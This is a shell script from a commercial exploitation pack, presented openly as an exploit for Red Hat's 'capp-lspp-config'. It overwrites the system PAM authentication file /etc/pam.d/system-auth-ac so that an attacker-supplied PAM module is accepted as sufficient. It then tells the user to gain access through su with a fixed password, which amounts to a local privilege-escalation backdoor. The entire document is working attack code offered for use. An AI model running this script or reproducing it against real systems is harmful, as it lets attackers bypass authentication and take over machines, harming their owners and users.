#! /bin/sh

#
# Proprietary D2 Exploitation Pack source code - use only under the license
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2008
#

AUTH="/etc/pam.d/system-auth-ac"
D2SEC_AUTH=$1
TMP="/dev/shm"

echo "D2SEC (C) 2007-2008 Red Hat 'capp-lspp-config' Exploit"
echo

if [ ! $1 ]
then
	echo "usage: $0 <d2sec_pam_unix.so path>"
	echo
	exit
fi

if [ ! -w $AUTH ]
then
	echo "[-] $AUTH not found or not writable" 
	echo
	exit
fi

if [ ! -d "/dev/shm" ]
then
	$TMP = "/tmp"
fi

ORIG="$TMP/system-auth-ac.o"

echo "[+] backup $AUTH in $ORIG"
cp -p $AUTH $ORIG

echo "[+] overwrite $AUTH"
echo "auth        required      pam_env.so" > $AUTH
echo "auth        sufficient    $D2SEC_AUTH nullok try_first_pass" >> $AUTH 
echo "auth        requisite     pam_succeed_if.so uid >= 500 quiet" >> $AUTH
echo "auth        required      pam_deny.so" >> $AUTH
echo "account     required      pam_unix.so" >> $AUTH
echo "account     sufficient    pam_succeed_if.so uid < 500 quiet" >> $AUTH
echo "account     required      pam_permit.so" >> $AUTH
echo "password    requisite     pam_cracklib.so try_first_pass retry=3" >> $AUTH
echo "password    sufficient    pam_unix.so md5 shadow nullok try_first_pass use_authtok" >> $AUTH
echo "password    required      pam_deny.so" >> $AUTH
echo "session     optional      pam_keyinit.so revoke" >> $AUTH
echo "session     required      pam_limits.so" >> $AUTH
echo "session     [success=1 default=ignore] pam_succeed_if.so service in crond quiet use_uid" >> $AUTH
echo "session     required      pam_unix.so" >> $AUTH

echo "[#] run su with 'd2sec' password"
echo "[!] don't forget to delete $D2SEC_AUTH and to restore $AUTH with $ORIG"
